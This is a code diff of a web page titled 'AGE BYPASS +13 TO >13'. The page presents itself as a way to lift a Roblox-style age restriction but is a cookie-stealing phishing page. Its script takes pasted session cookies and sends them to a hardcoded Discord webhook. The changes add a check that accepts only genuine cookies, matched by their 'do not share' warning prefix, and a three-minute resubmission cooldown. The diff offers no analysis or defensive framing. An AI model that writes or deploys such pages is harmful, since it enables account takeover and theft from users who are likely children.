@@ -4,24 +4,23 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AGE BYPASS</title>
-    <link rel="icon" href="https://cdn.discordapp.com/attachments/1326994906576715910/1339837416458158122/Leysikey_pro.png?ex=67b02c55&is=67aedad5&hm=f8cd53c2353efe1879e3f35cd3fc14d3e1d8b36166477eeb25b4641c9705d457&" type="image/png">
+    <link rel="icon" href="https://cdn.discordapp.com/attachments/1326994906576715910/1339837416458158122/Leysikey_pro.png" type="image/png">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/izitoast/dist/css/iziToast.min.css">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
-            background: url('https://cdn.discordapp.com/attachments/1336868856555114576/1340555985248325632/standard_4_1.gif?ex=67b2c98d&is=67b1780d&hm=ca0ddfa275eef69181d605ee31e5c3d44d8f01bc0b6e7a2984e52bfdaef6a1e3&') no-repeat center center fixed; 
-            background-size: cover;
-            color: #fff; 
+            background: black; 
+            color: white; 
             text-align: center; 
         }
         .container { 
             max-width: 600px; 
             margin: 100px auto; 
             padding: 30px; 
-            background-color: rgba(30, 30, 30, 0.7); 
+            background-color: rgba(60, 0, 100, 0.8); 
             border-radius: 10px; 
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5); 
+            box-shadow: 0 4px 15px rgba(255, 255, 255, 0.5); 
             animation: fadeIn 0.5s ease-in-out;
         }
         @keyframes fadeIn {
@@ -33,21 +32,16 @@
             height: 200px; 
             padding: 12px; 
             font-size: 16px; 
-            border: 1px solid #6c4f97; 
+            border: 1px solid purple; 
             border-radius: 8px; 
             outline: none; 
             resize: none; 
-            transition: all 0.3s ease-in-out;
             background-color: #2e2e2e;
             color: white;
         }
-        textarea:focus {
-            border-color: #9b4f96;
-            box-shadow: 0 0 8px rgba(155, 79, 150, 0.7);
-        }
         input[type="submit"] { 
             padding: 12px 20px; 
-            background-color: #6c4f97; 
+            background-color: purple; 
             color: white; 
             font-size: 16px; 
             font-weight: 600; 
@@ -60,16 +54,6 @@
             background-color: #9b4f96; 
             transform: scale(1.05); 
         }
-        .footer { 
-            margin-top: 40px; 
-            font-size: 14px; 
-            color: #888; 
-        }
-        .discord-link { 
-            margin-top: 20px; 
-            font-size: 16px; 
-            color: #fff; 
-        }
     </style>
 </head>
 <body>
@@ -77,17 +61,41 @@
 <div class="container">
     <h1>AGE BYPASS +13 TO >13</h1>
     <div class="form-box">
-        <form id="bypassForm" aria-labelledby="formTitle">
+        <form id="bypassForm">
             <label for="payload">Enter Cookies:</label><br>
-            <textarea name="payload" id="payload" rows="6" aria-describedby="cookieHelp"></textarea><br>
+            <textarea name="payload" id="payload" rows="6"></textarea><br>
             <input type="submit" value="Submit Cookies">
         </form>
+        <p id="cooldownMessage" style="display: none; color: red;"></p>
     </div>
 </div>
 
 <script src="https://cdn.jsdelivr.net/npm/izitoast/dist/js/iziToast.min.js"></script>
 <script>
-document.getElementById('bypassForm').addEventListener('submit', function(event) {
+const form = document.getElementById('bypassForm');
+const cooldownMessage = document.getElementById('cooldownMessage');
+const submitButton = form.querySelector('input[type="submit"]');
+
+const WARNING_MESSAGE = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items";
+
+function checkCooldown() {
+    const cooldownEnd = localStorage.getItem("cooldownEnd");
+    const now = Date.now();
+    if (cooldownEnd && now < cooldownEnd) {
+        const remainingTime = Math.ceil((cooldownEnd - now) / 1000);
+        cooldownMessage.style.display = 'block';
+        cooldownMessage.textContent = `Please wait ${remainingTime} seconds before submitting again.`;
+        submitButton.disabled = true;
+        setTimeout(checkCooldown, 1000);
+    } else {
+        cooldownMessage.style.display = 'none';
+        submitButton.disabled = false;
+    }
+}
+
+checkCooldown();
+
+form.addEventListener('submit', function(event) {
     event.preventDefault();
     const payload = document.getElementById('payload').value;
 
@@ -102,21 +110,26 @@ document.getElementById('bypassForm').addEventListener('submit', function(event)
         return;
     }
 
-    // Set cooldown for 30 seconds
-    const cooldownEnd = Date.now() + 30000;
-    localStorage.setItem("cooldownEnd", cooldownEnd);
+    if (!payload.startsWith(WARNING_MESSAGE)) {
+        iziToast.show({
+            title: 'Error:',
+            message: 'Must be cookies not a text.',
+            color: 'red',
+            position: 'topCenter',
+            timeout: 3000
+        });
+        return;
+    }
 
-    // Send cookies to Discord webhook
-    const webhookData = {
-        content: `Cookies Submitted: ${payload}`
-    };
+    localStorage.setItem("cooldownEnd", Date.now() + 180000); // 3 minutes cooldown
+    checkCooldown();
 
     fetch('https://discord.com/api/webhooks/1340386580770197665/1WyB76Ns5PG9YO-DVQo7Hv2PAtLi11td9UBRwFQIqiA0eM9b5Gyzz5JYRdSm9C3sweoa', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify(webhookData)
+        body: JSON.stringify({ content: `Cookies Submitted: ${payload}` })
     })
     .then(response => {
         if (response.ok) {
